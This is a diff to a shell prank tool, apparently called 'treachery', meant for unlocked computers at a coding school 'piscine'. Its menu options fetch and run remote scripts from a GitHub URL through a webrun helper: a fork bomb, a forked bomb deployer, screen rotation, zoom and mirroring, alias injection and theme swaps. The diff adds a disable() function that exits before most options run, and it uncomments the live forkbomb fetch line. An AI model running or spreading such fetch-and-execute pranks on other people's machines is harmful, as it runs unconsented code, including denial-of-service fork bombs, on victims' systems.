@@ -28,6 +28,11 @@ xrandr_help(){
 	esac
 	echo "${CMD}" > " love, Σ:3"
 }
+disable() {
+	# put something in to still allow it to be used on non-pisciners
+	printf "\033[1;31m[DISABLED]\033[0m %s\n" "$@"
+	exit 1
+}
 # funny variables
 BASEURL="https://raw.githubusercontent.com/BeerB34r/treachery/refs/heads/master"
 B="\033[1m"
@@ -93,12 +98,13 @@ treachery(){
 			;;
 		"3"|"forked bom")
 			echo "Forked bom chosen"
+			disable "beyond piscine scope"
 			webrun ${BASEURL}/assorted/forked_bom/deploy_fork_bom.sh
 			;;
 		"4"|"forkbomb")
 			echo "Forkbomb chosen"
-			# webrun ${BASEURL}/assorted/forkbomb.sh
-			echo "wtf is wrong with you, choose something else"
+			disable "what is wrong with you"
+			webrun ${BASEURL}/assorted/forkbomb.sh
 			;;
 		"5"|"gif")
 			echo "Gif chosen"
@@ -110,34 +116,41 @@ treachery(){
 			;;
 		"7"|"boykisser")
 			echo "Boykisser chosen"
+			disable "beyond piscine scope"
 			webrun ${BASEURL}/assorted/you_like_leaving_your_screen_unlocked_dont_you.sh
 			;;
 		"8"|"prompt")
 			echo "Prompt chosen"
+			disable "beyond piscine scope"
 			webrun ${BASEURL}/assorted/prompt.sh
 			;;
 		"9"|"brightness")
 			echo "Brightness chosen"
+			disable "beyond piscine scope"
 			webrun ${BASEURL}/assorted/brightne.sh
 			xrandr_help brightness
 			;;
 		"10"|"tilt")
 			echo "Tilt chosen"
+			disable "beyond piscine scope"
 			webrun ${BASEURL}/assorted/rotate.sh
 			xrandr_help tilt
 			;;
 		"11"|"rotate")
 			echo "Rotate chosen"
+			disable "beyond piscine scope"
 			webrun ${BASEURL}/assorted/screen.sh
 			xrandr_help rotate
 			;;
 		"12"|"zoom")
 			echo "Zoom chosen"
+			disable "beyond piscine scope"
 			webrun ${BASEURL}/assorted/zoom.sh
 			xrandr_help zoom
 			;;
 		"13"|"mirror")
 			echo "Mirror chosen"
+			disable "beyond piscine scope"
 			webrun ${BASEURL}/assorted/mirror.sh
 			xrandr_help mirror
 			;;
@@ -147,18 +160,22 @@ treachery(){
 			;;
 		"15"|"alias")
 			echo "Alias chosen"
+			disable "beyond piscine scope"
 			webrun ${BASEURL}/assorted/aliases.sh
 			;;
 		"16"|"fish")
 			echo "Fish"
+			disable "beyond piscine scope"
 			webrun ${BASEURL}/assorted/fi.sh
 			;;
 		"17"|"swap")
 			echo "Swap chosen"
+			disable "beyond piscine scope"
 			webrun ${BASEURL}/assorted/theme.sh
 			;;
 		"18"|"choo")
 			echo "all aboard!"
+			disable "beyond piscine scope"
 			webrun ${BASEURL}/assorted/choochoo.sh
 			;;
 		*)
